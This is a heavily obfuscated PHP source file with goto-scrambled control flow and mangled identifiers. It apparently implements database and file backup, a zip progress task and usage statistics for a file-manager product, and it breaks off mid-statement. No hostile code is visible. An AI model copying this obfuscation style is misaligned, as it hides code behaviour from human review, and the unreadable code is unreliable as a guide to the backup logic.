<?php
 goto eğ«ë”‹ò; CÏ®ŞÈÇÔ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto E…’Ûá·’•; C„òéÙÆĞ: Backup::set($a®ÂÉµ½İ£); if ($f—ÕÂÍÉ¶ > $bô„‘²É¼é) { write_log(array($a‘´ç©™ÈÒ[746], $a®ÂÉµ½İ£), $a‘´ç©™ÈÒ[735]); return !1; } return !0; goto cäÌÙ¨îÄ; Déå¬á©“Ï: $Få„¿Ğá° = new DbManage($dçøãäÀ´è, $bŠÔÄäª); $a®ÂÉµ½İ£ = array($a‘´ç©™ÈÒ[729] => $bŠÔÄäª, $a‘´ç©™ÈÒ[730] => time()); Backup::set($a®ÂÉµ½İ£); goto bÓˆù“Š; bÓˆù“Š: $b¨àÚ¢ç³ = $this->tmpFilesPath() . $a‘´ç©™ÈÒ[731] . self::$name . $a‘´ç©™ÈÒ[8]; del_dir($b¨àÚ¢ç³); mk_dir($b¨àÚ¢ç³); goto e„ãÙª”È•; E…’Ûá·’•: $a‘´ç©™ÈÒ =& $_SERVER[æ§›¦ÌáØ]; $C÷ò¹Õ®Üš = Backup::get(); self::$io = $C÷ò¹Õ®Üš[$a‘´ç©™ÈÒ[705]]; goto a¥¤Šæ¬ô›; aÃêªà—›æ: if (isset($B‚À‹ê„Ñø->task[$a‘´ç©™ÈÒ[741]])) { $A˜ôÊñ“ÅÄ = $B‚À‹ê„Ñø->task[$a‘´ç©™ÈÒ[741]] ? $B‚À‹ê„Ñø->task[$a‘´ç©™ÈÒ[741]] : timeFloat(); $AªŞµò¿ø™ = $A˜ôÊñ“ÅÄ - $B‚À‹ê„Ñø->task[$a‘´ç©™ÈÒ[742]]; if ($AªŞµò¿ø™ >= 0.2) { $f—ÕÂÍÉ¶ += 1; } } $B‚À‹ê„Ñø->end(); $a®ÂÉµ½İ£ = array($a‘´ç©™ÈÒ[729] => $bŠÔÄäª, $a‘´ç©™ÈÒ[726] => 1, $a‘´ç©™ÈÒ[743] => $f—ÕÂÍÉ¶, $a‘´ç©™ÈÒ[744] => $bô„‘²É¼é, $a‘´ç©™ÈÒ[745] => time()); goto C„òéÙÆĞ; e„ãÙª”È•: $f—ÕÂÍÉ¶ = $bô„‘²É¼é = 0; try { $fËÊë—à… = $Få„¿Ğá°->db()->getTables(); } catch (Exception $FÊÈ…Îë³Ÿ) { return !1; } $fËÊë—à… = array_diff($fËÊë—à…, array($a‘´ç©™ÈÒ[732], $a‘´ç©™ÈÒ[733])); goto FÚÍ£ğ¡Ğª; FÚÍ£ğ¡Ğª: foreach ($fËÊë—à… as $D­ÙÊÂË) { $f—ÕÂÍÉ¶ += $Få„¿Ğá°->model($D­ÙÊÂË)->count(); } $B‚À‹ê„Ñø = new Task($a‘´ç©™ÈÒ[734], $a‘´ç©™ÈÒ[735], $f—ÕÂÍÉ¶, LNG($a‘´ç©™ÈÒ[736]) . $a‘´ç©™ÈÒ[737] . LNG($a‘´ç©™ÈÒ[738])); foreach ($fËÊë—à… as $D­ÙÊÂË) { $CˆÙÌİˆ‘æ = $b¨àÚ¢ç³ . $D­ÙÊÂË . $a‘´ç©™ÈÒ[739]; $dËèäåãÑ¡ = null; if ($D­ÙÊÂË == $a‘´ç©™ÈÒ[740] && (!isset($C÷ò¹Õ®Üš[$a‘´ç©™ÈÒ[708]]) || $C÷ò¹Õ®Üš[$a‘´ç©™ÈÒ[708]] == $a‘´ç©™ÈÒ[191])) { $dËèäåãÑ¡ = self::$io; } $bô„‘²É¼é += $Få„¿Ğá°->sqlFromDb($D­ÙÊÂË, $CˆÙÌİˆ‘æ, $B‚À‹ê„Ñø, $dËèäåãÑ¡); } goto aÃêªà—›æ; a¥¤Šæ¬ô›: self::$name = $C÷ò¹Õ®Üš[$a‘´ç©™ÈÒ[28]]; $dçøãäÀ´è = $GLOBALS[$a‘´ç©™ÈÒ[6]][$a‘´ç©™ÈÒ[17]]; $bŠÔÄäª = $this->_dbType($dçøãäÀ´è); goto Déå¬á©“Ï; cäÌÙ¨îÄ: } private function _dbType($Fšİ—Ô«ìÓ) { goto BíŒÎ¹­×; dá×èªÁÔ›: if ($cë’ÀÁÙÀ® == $eÉŸŞ¯ºß[748]) { $AÀš¬³ÌŒ = explode($eÉŸŞ¯ºß[4], $Fšİ—Ô«ìÓ[$eÉŸŞ¯ºß[749]]); $cë’ÀÁÙÀ® = $AÀš¬³ÌŒ[0]; } $eó¢Ÿ§Ô¬ = array($eÉŸŞ¯ºß[750] => $eÉŸŞ¯ºß[9], $eÉŸŞ¯ºß[751] => $eÉŸŞ¯ºß[752]); if (isset($eó¢Ÿ§Ô¬[$cë’ÀÁÙÀ®])) { $cë’ÀÁÙÀ® = $eó¢Ÿ§Ô¬[$cë’ÀÁÙÀ®]; } goto DÑêÁ±ç; BíŒÎ¹­×: $eÉŸŞ¯ºß =& $_SERVER[æ§›¦ÌáØ]; $Fšİ—Ô«ìÓ = array_change_key_case($Fšİ—Ô«ìÓ); $cë’ÀÁÙÀ® = $Fšİ—Ô«ìÓ[$eÉŸŞ¯ºß[747]]; goto dá×èªÁÔ›; DÑêÁ±ç: return $cë’ÀÁÙÀ®; goto CÆ’¿Ã·Î½; CÆ’¿Ã·Î½: } private function tmpFilesPath() { $c–ôÑ“ï…§ =& $_SERVER[æ§›¦ÌáØ]; $EŒ±ãÉ­Ş = TEMP_FILES; if ($GLOBALS[$c–ôÑ“ï…§[6]][$c–ôÑ“ï…§[88]][$c–ôÑ“ï…§[753]]) { $EŒ±ãÉ­Ş = $GLOBALS[$c–ôÑ“ï…§[6]][$c–ôÑ“ï…§[88]][$c–ôÑ“ï…§[753]]; if (!mk_dir($EŒ±ãÉ­Ş) || !is_writable($EŒ±ãÉ­Ş) || !IO::mkfile($EŒ±ãÉ­Ş . $c–ôÑ“ï…§[754])) { $EŒ±ãÉ­Ş = TEMP_FILES; } } return $EŒ±ãÉ­Ş; } } class BackupDbFile { public function __construct() { } public function index() { goto E¨Å£Û†ß†; EƒöÀ×ƒö: $c—¡ƒÉÕŞç = IO::listPath($fÂíÏ½¥Ï¿); $D¹ô×¥¯¸ˆ = isset($c—¡ƒÉÕŞç[$E®Ş¹„’ [74]]) ? $c—¡ƒÉÕŞç[$E®Ş¹„’ [74]] : array(); $d©²ÀŒÑ±¦ = array_sum(array_column($D¹ô×¥¯¸ˆ, $E®Ş¹„’ [78])); goto e¨»‰°ã; Aëš©ƒ®¬: $Eë¤„±ù = CONTROLLER_DIR . $E®Ş¹„’ [761]; $Bƒ´­ÄÇ£è = CONTROLLER_DIR . $E®Ş¹„’ [762]; IO::copy($Eë¤„±ù, $A¥©‘ö‚); goto fã°Šã¨; D’—†ò‚: $fÂíÏ½¥Ï¿ = $this->tmpFilesPath() . "\142\x61\143\153\165\x70\137{$E¼Œ´»šŒ}\x2f"; $A¥©‘ö‚ = $this->backupPath($bçåø£òê­); if (!($A¥©‘ö‚ = IO::mkdir($A¥©‘ö‚))) { return !1; } goto EƒöÀ×ƒö; e¨»‰°ã: if (!$d©²ÀŒÑ±¦) { return !1; } $C¥¿™ÔÂÒµ = array($E®Ş¹„’ [755] => $d©²ÀŒÑ±¦, $E®Ş¹„’ [756] => time()); Backup::set($C¥¿™ÔÂÒµ); goto E³µø¾®âˆ; fã°Šã¨: IO::copy($Bƒ´­ÄÇ£è, $A¥©‘ö‚); $DÃö¸“ÑÏ’->end(); $C¥¿™ÔÂÒµ = array($E®Ş¹„’ [763] => $d©²ÀŒÑ±¦, $E®Ş¹„’ [764] => time()); goto CøÂØ…±à; E¨Å£Û†ß†: $E®Ş¹„’  =& $_SERVER[æ§›¦ÌáØ]; $bçåø£òê­ = Backup::get(); $E¼Œ´»šŒ = $bçåø£òê­[$E®Ş¹„’ [28]]; goto D’—†ò‚; CøÂØ…±à: Backup::set($C¥¿™ÔÂÒµ); return !0; goto FŞÙôç×•Å; E³µø¾®âˆ: $DÃö¸“ÑÏ’ = new TaskFileTransfer($E®Ş¹„’ [757], $E®Ş¹„’ [735], count($D¹ô×¥¯¸ˆ), LNG($E®Ş¹„’ [736]) . $E®Ş¹„’ [440] . LNG($E®Ş¹„’ [738]) . $E®Ş¹„’ [758]); $DÃö¸“ÑÏ’->task[$E®Ş¹„’ [716]] = $d©²ÀŒÑ±¦; foreach ($c—¡ƒÉÕŞç[$E®Ş¹„’ [74]] as $Dİ´Ô©×Î) { $b‘ˆ¦”ÂŒ = IO::move($Dİ´Ô©×Î[$E®Ş¹„’ [76]], $A¥©‘ö‚); if (!$b‘ˆ¦”ÂŒ) { $DÃö¸“ÑÏ’->end(); $Dæ†¢ôÃ¼ó = IO::getLastError($E®Ş¹„’ [759] . $Dİ´Ô©×Î[$E®Ş¹„’ [76]] . $E®Ş¹„’ [760] . $A¥©‘ö‚ . $E®Ş¹„’ [517]); write_log($Dæ†¢ôÃ¼ó, $E®Ş¹„’ [735]); return !1; } } goto Aëš©ƒ®¬; FŞÙôç×•Å: } private function backupPath($DÂÕŒº¬Á¼) { $c¾µÜÔ®®É =& $_SERVER[æ§›¦ÌáØ]; $bâÕ¼ê†›‡ = $DÂÕŒº¬Á¼[$c¾µÜÔ®®É[28]]; $D„Â˜²Üù = Model($c¾µÜÔ®®É[723])->get($c¾µÜÔ®®É[724]); $cÜ­Ó«¦ÉÏ = substr(md5($c¾µÜÔ®®É[725] . $D„Â˜²Üù . $bâÕ¼ê†›‡), 0, 8); return "\x7b\151\157\x3a{$DÂÕŒº¬Á¼[$c¾µÜÔ®®É[705]]}\175\x2f\x64\141\x74\141\142\x61\163\145\57\142\141\x63\x6b\165\x70\57" . $bâÕ¼ê†›‡ . $c¾µÜÔ®®É[71] . $cÜ­Ó«¦ÉÏ; } private function tmpFilesPath() { $eæ‰µœ•Û… =& $_SERVER[æ§›¦ÌáØ]; $fãÊà‚äÀ = TEMP_FILES; if ($GLOBALS[$eæ‰µœ•Û…[6]][$eæ‰µœ•Û…[88]][$eæ‰µœ•Û…[753]]) { $fãÊà‚äÀ = $GLOBALS[$eæ‰µœ•Û…[6]][$eæ‰µœ•Û…[88]][$eæ‰µœ•Û…[753]]; if (!mk_dir($fãÊà‚äÀ) || !is_writable($fãÊà‚äÀ) || !IO::mkfile($fãÊà‚äÀ . $eæ‰µœ•Û…[754])) { $fãÊà‚äÀ = TEMP_FILES; } } return $fãÊà‚äÀ; } } class BackupFile { public function __construct() { } public function index() { goto C¼ê•œ”µ’; Bƒ¸Çˆ‚½ƒ: $FÈ©¬Ÿ„Ã = (int) Model($_SERVER[æ§›¦ÌáØ][740])->where($dù£§Ñé¹‰)->count($_SERVER[æ§›¦ÌáØ][447]); $e®Ë½ÂÜê” = (int) Model($_SERVER[æ§›¦ÌáØ][740])->where($dù£§Ñé¹‰)->sum($_SERVER[æ§›¦ÌáØ][78]); $eš‡¼‰Ã¸ = new TaskFileTransfer($_SERVER[æ§›¦ÌáØ][767], $_SERVER[æ§›¦ÌáØ][735], $FÈ©¬Ÿ„Ã, LNG($_SERVER[æ§›¦ÌáØ][736]) . $_SERVER[æ§›¦ÌáØ][737] . LNG($_SERVER[æ§›¦ÌáØ][768])); goto Dã¦ÍÏ­Ü­; Fßá‘Áï¢º: $this->_fileFilter($c÷­»à”); return !0; goto E¶Ğ® Äì; d×·ñô¹™³: $C×¹¤ë©°‚ = array($_SERVER[æ§›¦ÌáØ][781] => 1, $_SERVER[æ§›¦ÌáØ][476] => time(), $_SERVER[æ§›¦ÌáØ][728] => 1, $_SERVER[æ§›¦ÌáØ][778] => $Bã¯Î°¨¥Ä, $_SERVER[æ§›¦ÌáØ][770] => $e®Ë½ÂÜê”, $_SERVER[æ§›¦ÌáØ][769] => $FÈ©¬Ÿ„Ã, $_SERVER[æ§›¦ÌáØ][782] => time()); if ($dîŸæ­ïŠ§) { $C×¹¤ë©°‚[$_SERVER[æ§›¦ÌáØ][779]] = $b„¸Â‘–š‡; $C×¹¤ë©°‚[$_SERVER[æ§›¦ÌáØ][780]] = $DÎÀÃöŒ«¡; } Backup::set($C×¹¤ë©°‚); goto Fßá‘Áï¢º; Dã¦ÍÏ­Ü­: $eš‡¼‰Ã¸->task[$_SERVER[æ§›¦ÌáØ][716]] = $e®Ë½ÂÜê”; $C×¹¤ë©°‚ = array($_SERVER[æ§›¦ÌáØ][769] => $FÈ©¬Ÿ„Ã, $_SERVER[æ§›¦ÌáØ][770] => $e®Ë½ÂÜê”, $_SERVER[æ§›¦ÌáØ][771] => time()); Backup::set($C×¹¤ë©°‚); goto Dò»âÚ‘®š; d™®“Ş¹Ì: $eÜäï§¹”» = 1000; $Fœ¸ÖÉÒ‘ = $dîŸæ­ïŠ§ = 0; $c÷­»à” = array(); goto BÎôßÆï ½; C¼ê•œ”µ’: $CºåèîÃŒÄ = Backup::get(); $Bã¯Î°¨¥Ä = $CºåèîÃŒÄ[$_SERVER[æ§›¦ÌáØ][291]][$_SERVER[æ§›¦ÌáØ][193]][$_SERVER[æ§›¦ÌáØ][447]]; $dù£§Ñé¹‰ = array($_SERVER[æ§›¦ÌáØ][448] => array($_SERVER[æ§›¦ÌáØ][765], $Bã¯Î°¨¥Ä), $_SERVER[æ§›¦ÌáØ][766] => array($_SERVER[æ§›¦ÌáØ][329], $CºåèîÃŒÄ[$_SERVER[æ§›¦ÌáØ][705]])); goto Bƒ¸Çˆ‚½ƒ; BÎôßÆï ½: $DÎÀÃöŒ«¡ = $b„¸Â‘–š‡ = 0; do { $d³² ©èØ× = $_SERVER[æ§›¦ÌáØ][772]; $EĞšÅŞÜ½ç = Model($_SERVER[æ§›¦ÌáØ][740])->where($dù£§Ñé¹‰)->field($d³² ©èØ×)->order($_SERVER[æ§›¦ÌáØ][773])->selectPage($eÜäï§¹”», $a‘èæÀÆ­); $FÔ°£ÔŞØì = !empty($EĞšÅŞÜ½ç[$_SERVER[æ§›¦ÌáØ][367]]) ? $EĞšÅŞÜ½ç[$_SERVER[æ§›¦ÌáØ][367]] : array(); foreach ($FÔ°£ÔŞØì as $b£™Î™ƒĞ‘) { goto dÙ…éÈğìÄ; E†İ ¶‘Š½: $Fœ¸ÖÉÒ‘ += $b£™Î™ƒĞ‘[$_SERVER[æ§›¦ÌáØ][78]]; $b„¸Â‘–š‡ += 1; $DÎÀÃöŒ«¡ += $b£™Î™ƒĞ‘[$_SERVER[æ§›¦ÌáØ][78]]; goto AÏ¥“â’¥‘; dÙ…éÈğìÄ: if (!$this->_fileExist($b£™Î™ƒĞ‘, $c÷­»à”, $f¹çÛ¿Ã«ª)) { $FÈ©¬Ÿ„Ã -= 1; $e®Ë½ÂÜê” -= (int) $b£™Î™ƒĞ‘[$_SERVER[æ§›¦ÌáØ][78]]; write_log("\x66\x69\x6c\x65\40\156\x6f\x74\40\145\170\x69\x73\x74\56\146\x69\154\x65\x49\104\x3a{$b£™Î™ƒĞ‘[$_SERVER[æ§›¦ÌáØ][447]]}\x2c\40\160\x61\164\x68\x3a{$b£™Î™ƒĞ‘[$_SERVER[æ§›¦ÌáØ][76]]}", $_SERVER[æ§›¦ÌáØ][774]); continue; } $B“Ã»áãå¿ = $b£™Î™ƒĞ‘[$_SERVER[æ§›¦ÌáØ][76]]; $cŸô°˜Ã¼Î = "\173\151\x6f\72{$CºåèîÃŒÄ[$_SERVER[æ§›¦ÌáØ][705]]}\x7d" . substr($B“Ã»áãå¿, strlen("\173\151\157\72{$b£™Î™ƒĞ‘[$_SERVER[æ§›¦ÌáØ][775]]}\x7d")); goto bÄ—¨‚¦™Œ; AÏ¥“â’¥‘: if ($Fœ¸ÖÉÒ‘ >= 1024 * 1024 * 100) { $C×¹¤ë©°‚ = array($_SERVER[æ§›¦ÌáØ][778] => $Bã¯Î°¨¥Ä, $_SERVER[æ§›¦ÌáØ][779] => $b„¸Â‘–š‡, $_SERVER[æ§›¦ÌáØ][780] => $DÎÀÃöŒ«¡); Backup::set($C×¹¤ë©°‚); $Fœ¸ÖÉÒ‘ = $dîŸæ­ïŠ§ = 0; } goto D¬ºŒù«…é; bÄ—¨‚¦™Œ: if (IO::exist($cŸô°˜Ã¼Î)) { $eš‡¼‰Ã¸->updateFileEnd($b£™Î™ƒĞ‘[$_SERVER[æ§›¦ÌáØ][28]], $b£™Î™ƒĞ‘[$_SERVER[æ§›¦ÌáØ][78]]); } else { $cŸô°˜Ã¼Î = get_path_father($cŸô°˜Ã¼Î); IO::mkdir($cŸô°˜Ã¼Î); if (!IO::copy($B“Ã»áãå¿, $cŸô°˜Ã¼Î, $_SERVER[æ§›¦ÌáØ][776])) { write_log($_SERVER[æ§›¦ÌáØ][777] . $B“Ã»áãå¿ . $_SERVER[æ§›¦ÌáØ][760] . $cŸô°˜Ã¼Î . $_SERVER[æ§›¦ÌáØ][517], $_SERVER[æ§›¦ÌáØ][735]); $bÍ†µÓØ‹ = !1; break; } } $Bã¯Î°¨¥Ä = $b£™Î™ƒĞ‘[$_SERVER[æ§›¦ÌáØ][447]]; $dîŸæ­ïŠ§ += 1; goto E†İ ¶‘Š½; D¬ºŒù«…é: } $eÒôÉ‡Óš© = count($FÔ°£ÔŞØì); $a‘èæÀÆ­++; } while ($eÒôÉ‡Óš© == $eÜäï§¹”»); $eš‡¼‰Ã¸->end(); goto d×·ñô¹™³; Dò»âÚ‘®š: $bÍ†µÓØ‹ = !0; $f¹çÛ¿Ã«ª = $this->storeIds(); $a‘èæÀÆ­ = 1; goto d™®“Ş¹Ì; E¶Ğ® Äì: } private function _fileExist($eà”– ›Œµ, &$d˜Ã§í¯èº, $dØŠçùƒÛã) { goto F‚ˆ¹ğ«Çõ; F‚ˆ¹ğ«Çõ: $aªò¿ß‡  =& $_SERVER[æ§›¦ÌáØ]; $F«’¼êÁÜš = $eà”– ›Œµ[$aªò¿ß‡ [76]]; if (in_array($eà”– ›Œµ[$aªò¿ß‡ [447]], $d˜Ã§í¯èº)) { return !1; } goto AÈ“¬½„Ûí; Fõø“„“­Â: $d˜Ã§í¯èº = array_merge($d˜Ã§í¯èº, array_to_keyvalue($AîğÎ·ÓÍĞ, $aªò¿ß‡ [33], $aªò¿ß‡ [447])); return !1; goto eà˜š­åù; Aö’ß‘œÀÑ: if (IO::exist($Béñğ¶éš)) { $d˜Ã§í¯èº[] = $eà”– ›Œµ[$aªò¿ß‡ [447]]; return !1; } $aàÛˆÎÅÉŠ = array($aªò¿ß‡ [775] => $eà”– ›Œµ[$aªò¿ß‡ [775]], $aªò¿ß‡ [76] => array($aªò¿ß‡ [380], "{$Béñğ¶éš}\x25")); $AîğÎ·ÓÍĞ = Model($aªò¿ß‡ [740])->where($aàÛˆÎÅÉŠ)->field($aªò¿ß‡ [448])->select(); goto Fõø“„“­Â; AÈ“¬½„Ûí: if (!in_array($eà”– ›Œµ[$aªò¿ß‡ [775]], $dØŠçùƒÛã)) { return !1; } if (IO::exist($F«’¼êÁÜš)) { return !0; } $Béñğ¶éš = get_path_father($F«’¼êÁÜš); goto Aö’ß‘œÀÑ; eà˜š­åù: } private function _fileFilter($e¾™±ßœõæ) { $b¯À‚°÷ğ =& $_SERVER[æ§›¦ÌáØ]; if (empty($e¾™±ßœõæ)) { return; } $e¥®¤öŞİ = array($b¯À‚°÷ğ[447] => array($b¯À‚°÷ğ[7], array_unique($e¾™±ßœõæ))); $e†Å‘ßÓë½ = Model($b¯À‚°÷ğ[783])->where($e¥®¤öŞİ)->field($b¯À‚°÷ğ[395])->select(); foreach ($e†Å‘ßÓë½ as $eğÃå‹„ËÚ) { Model($b¯À‚°÷ğ[783])->remove($eğÃå‹„ËÚ[$b¯À‚°÷ğ[395]], !1); } } private function storeIds() { $Fê²·Æ›×Ü =& $_SERVER[æ§›¦ÌáØ]; $a–Êí’î = Model($Fê²·Æ›×Ü[720])->listData(); $dõÊ £­Šî = array(); $E§ˆ¬­´÷ = $GLOBALS[$Fê²·Æ›×Ü[6]][$Fê²·Æ›×Ü[88]][$Fê²·Æ›×Ü[784]]; foreach ($a–Êí’î as $AË°ÕÒ¼ğ) { $d¾¡·ö‘ÙÂ = strtolower($AË°ÕÒ¼ğ[$Fê²·Æ›×Ü[94]]); if (!isset($E§ˆ¬­´÷[$d¾¡·ö‘ÙÂ])) { continue; } $c¦‘ˆØ Ñ = $Fê²·Æ›×Ü[72] . (isset($E§ˆ¬­´÷[$d¾¡·ö‘ÙÂ]) ? $E§ˆ¬­´÷[$d¾¡·ö‘ÙÂ] : ucfirst($d¾¡·ö‘ÙÂ)); if (!class_exists($c¦‘ˆØ Ñ)) { continue; } $dõÊ £­Šî[] = $AË°ÕÒ¼ğ[$Fê²·Æ›×Ü[393]]; } return $dõÊ £­Šî; } } goto BÀöÏæ¿ƒ­; fîËªŒİÍÖ: class TaskZip extends TaskFileTransfer { protected function startAfter() { $C·Š„Ì½°° =& $_SERVER[æ§›¦ÌáØ]; parent::startAfter(); Hook::bind($C·Š„Ì½°°[1613], array($this, $C·Š„Ì½°°[1608])); $f‡ªáÇÜÇœ =& $this->task; $f‡ªáÇÜÇœ[$C·Š„Ì½°°[1610]] = $C·Š„Ì½°°[1084]; if (!$f‡ªáÇÜÇœ[$C·Š„Ì½°°[1423]]) { $f‡ªáÇÜÇœ[$C·Š„Ì½°°[1423]] = LNG($C·Š„Ì½°°[1614]); } } protected function endAfter() { $dášÍ´Ì¹ =& $_SERVER[æ§›¦ÌáØ]; parent::endAfter(); Hook::unbind($dášÍ´Ì¹[1613], array($this, $dášÍ´Ì¹[1608])); } public function updateAfter() { $eåË„ëù =& $_SERVER[æ§›¦ÌáØ]; $E¯óùô–¼Ö =& $this->task; if (!$E¯óùô–¼Ö[$eåË„ëù[1011]] || !$E¯óùô–¼Ö[$eåË„ëù[716]]) { return; } if ($E¯óùô–¼Ö[$eåË„ëù[1610]] == $eåË„ëù[1084]) { $F¹ÔåæØ¬ = $E¯óùô–¼Ö[$eåË„ëù[1567]]; if ($E¯óùô–¼Ö[$eåË„ëù[1568]] != $eåË„ëù[1084]) { $F¹ÔåæØ¬ = 0; } $DÚöƒËŒí« = ($E¯óùô–¼Ö[$eåË„ëù[1571]] + $F¹ÔåæØ¬) / $E¯óùô–¼Ö[$eåË„ëù[716]]; $E¯óùô–¼Ö[$eåË„ëù[1521]] = $DÚöƒËŒí« * 0.3; } else { if ($E¯óùô–¼Ö[$eåË„ëù[1610]] == $eåË„ëù[311]) { $DÚöƒËŒí« = $E¯óùô–¼Ö[$eåË„ëù[1026]] / $E¯óùô–¼Ö[$eåË„ëù[1011]]; $E¯óùô–¼Ö[$eåË„ëù[1521]] = 0.3 + $DÚöƒËŒí« * 0.5; } else { if ($E¯óùô–¼Ö[$eåË„ëù[1610]] == $eåË„ëù[107]) { $DÚöƒËŒí« = 0; if ($E¯óùô–¼Ö[$eåË„ëù[1566]]) { $DÚöƒËŒí« = $E¯óùô–¼Ö[$eåË„ëù[1567]] / $E¯óùô–¼Ö[$eåË„ëù[1566]]; } $E¯óùô–¼Ö[$eåË„ëù[1521]] = 0.3 + 0.5 + $DÚöƒËŒí« * 0.2; } } } if ($E¯óùô–¼Ö[$eåË„ëù[1521]] > 0) { $böƒ¬…¾¦± = timeFloat() - $E¯óùô–¼Ö[$eåË„ëù[742]] - $E¯óùô–¼Ö[$eåË„ëù[1524]]; $E¯óùô–¼Ö[$eåË„ëù[1525]] = $böƒ¬…¾¦± * (1 - $E¯óùô–¼Ö[$eåË„ëù[1521]]) / $E¯óùô–¼Ö[$eåË„ëù[1521]]; } } public function copyFileStart($C´ÕòƒÒÉÒ, $f µÇ¿ŠÀ, $DìÍº¥—¬ç, $Fæ¡êÇÓç‰, $FŞÁ ÁŠª¦, $CÛŒí¨‚¥†) { $d—² Î¹°¾ =& $_SERVER[æ§›¦ÌáØ]; parent::copyFileStart($C´ÕòƒÒÉÒ, $f µÇ¿ŠÀ, $DìÍº¥—¬ç, $Fæ¡êÇÓç‰, $FŞÁ ÁŠª¦, $CÛŒí¨‚¥†); $eöŒÌòÚ =& $this->task; if ($eöŒÌòÚ[$d—² Î¹°¾[1610]] == $d—² Î¹°¾[311]) { $eöŒÌòÚ[$d—² Î¹°¾[1610]] = $d—² Î¹°¾[107]; } $this->update(); } public function copyFileEnd($a»†‚·´ñï, $f‹èì‘‹½, $C‡Ç¸ğÇ£, $BÙÎ˜ÄíïÈ, $D„ˆÙõ‘è, $D¸¹Ã–´·) { $EÆ†“‡¬Ô  =& $_SERVER[æ§›¦ÌáØ]; $AÖ¥ÚİŒœÅ =& $this->task; $AÖ¥ÚİŒœÅ[$EÆ†“‡¬Ô [1567]] = $AÖ¥ÚİŒœÅ[$EÆ†“‡¬Ô [1566]]; $AÖ¥ÚİŒœÅ[$EÆ†“‡¬Ô [1571]] += $AÖ¥ÚİŒœÅ[$EÆ†“‡¬Ô [1566]]; $AÖ¥ÚİŒœÅ[$EÆ†“‡¬Ô [1568]] = $EÆ†“‡¬Ô [33]; $this->update(); } public function nameParse($d ‘ÄËÚ) { $fµ¨õÆîïÍ =& $_SERVER[æ§›¦ÌáØ]; $BÛ„´÷ªâ‡ =& $this->task; if ($BÛ„´÷ªâ‡[$fµ¨õÆîïÍ[1026]] < $BÛ„´÷ªâ‡[$fµ¨õÆîïÍ[1011]]) { $Cà‰Ì©é¯á = get_path_this($d ‘ÄËÚ); if (strstr($Cà‰Ì©é¯á, $fµ¨õÆîïÍ[95])) { $BÛ„´÷ªâ‡[$fµ¨õÆîïÍ[1026]] += 1; } } if ($BÛ„´÷ªâ‡[$fµ¨õÆîïÍ[1610]] == $fµ¨õÆîïÍ[1084]) { $BÛ„´÷ªâ‡[$fµ¨õÆîïÍ[1610]] = $fµ¨õÆîïÍ[311]; } $BÛ„´÷ªâ‡[$fµ¨õÆîïÍ[1564]] = $d ‘ÄËÚ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($Fâ³Ùô Ë) { $C²…Û„° =& $_SERVER[æ§›¦ÌáØ]; $dï—Œ¢‘ÍÒ = array($C²…Û„°[575] => array($C²…Û„°[29] => $C²…Û„°[1615], $C²…Û„°[271] => array($C²…Û„°[222], $C²…Û„°[718], $C²…Û„°[1616], $C²…Û„°[1617])), $C²…Û„°[1618] => array($C²…Û„°[29] => $C²…Û„°[1619], $C²…Û„°[271] => array($C²…Û„°[222], $C²…Û„°[716], $C²…Û„°[1620], $C²…Û„°[1621], $C²…Û„°[1622]))); if (!isset($dï—Œ¢‘ÍÒ[$Fâ³Ùô Ë])) { return !1; } $this->optionType = $dï—Œ¢‘ÍÒ[$Fâ³Ùô Ë][$C²…Û„°[29]]; $this->field = $dï—Œ¢‘ÍÒ[$Fâ³Ùô Ë][$C²…Û„°[271]]; return !0; } public function listData($fÓ…¹“»¼ä = false, $Fº–‰Æ¢¸ä = "\x6d\x6f\x64\x69\x66\171\124\x69\x6d\x65", $DØÁÑªëİ = false) { return parent::listData($fÓ…¹“»¼ä, $Fº–‰Æ¢¸ä, $DØÁÑªëİ); } public function trendList($Bà—…ƒ‡ô) { goto DÏ²¤–Æ‰; A¶ôääƒ¿­: if (!isset($F«ÙÉŒà‡ˆ)) { $Bë‡ÅÇÅËñ = $Bà—…ƒ‡ô == $bŸ½ìÔ³á[575] ? $bŸ½ìÔ³á[519] : $bŸ½ìÔ³á[783]; $F«ÙÉŒà‡ˆ = Model($Bë‡ÅÇÅËñ)->min($bŸ½ìÔ³á[194]); } $e©±Õæ¤õ = $bŸ½ìÔ³á[1625] . ucfirst($Bà—…ƒ‡ô); $bêƒŒšàï = $this->dateList($F«ÙÉŒà‡ˆ); goto D«æÌ…„“; DÏ²¤–Æ‰: $bŸ½ìÔ³á =& $_SERVER[æ§›¦ÌáØ]; $d¦¾¾ï©Ã = $this->listData(); if ($d¦¾¾ï©Ã) { $CÏ°ô£Ù‹¹ = end($d¦¾¾ï©Ã); $B±ºñ•¸œ = date($bŸ½ìÔ³á[1623], strtotime($bŸ½ìÔ³á[1624])); if ($CÏ°ô£Ù‹¹[$bŸ½ìÔ³á[222]] == $B±ºñ•¸œ) { return $d¦¾¾ï©Ã; } $F«ÙÉŒà‡ˆ = strtotime($CÏ°ô£Ù‹¹[$bŸ½ìÔ³á[222]]); } goto A¶ôääƒ¿­; D«æÌ…„“: foreach ($bêƒŒšàï as $B±ºñ•¸œ) { $this->{$e©±Õæ¤õ}($B±ºñ•¸œ); } return $this->listData(); goto CŒ¿š½Ú÷Ò; CŒ¿š½Ú÷Ò: } private function dateList($A®­ì‘ìá˜) { $EÂÓÊ İÁ =& $_SERVER[æ§›¦ÌáØ]; $Bçôƒœ¢ê = $A®­ì‘ìá˜; $fÕ°¨¹ˆæŒ = strtotime($EÂÓÊ İÁ[1624]); $B‚ŞÖ­Ææ = array(); while ($Bçôƒœ¢ê <= $fÕ°¨¹ˆæŒ) { $B‚ŞÖ­Ææ[] = date($EÂÓÊ İÁ[1623], $Bçôƒœ¢ê); $Bçôƒœ¢ê = strtotime($EÂÓÊ İÁ[1626], $Bçôƒœ¢ê); } return $B‚ŞÖ­Ææ; } public function _recordUser($aƒ›ÅÔÊ = '') { goto A”‚ˆ„°êœ; bÇš¸˜Û£¾: $d¼‚ÕÆø±  = array($D´éøÎ‡×[194] => array($D´éøÎ‡×[961], $E•§›Ÿ†š)); $C¬“ì™Úç = Model($D´éøÎ‡×[519])->where($d¼‚ÕÆø± )->count($D´éøÎ‡×[1520]); $d¼‚ÕÆø± [$D´éøÎ‡×[194]] = array($D´éøÎ‡×[331], array($CÈ¢Ù éØ, $E•§›Ÿ†š)); goto EÇ¢ìØãÁˆ; EÇ¢ìØãÁˆ: $F„ƒ¦Ï–Ê× = Model($D´éøÎ‡×[519])->where($d¼‚ÕÆø± )->count($D´éøÎ‡×[1520]); $d¼‚ÕÆø± [$D´éøÎ‡×[29]] = 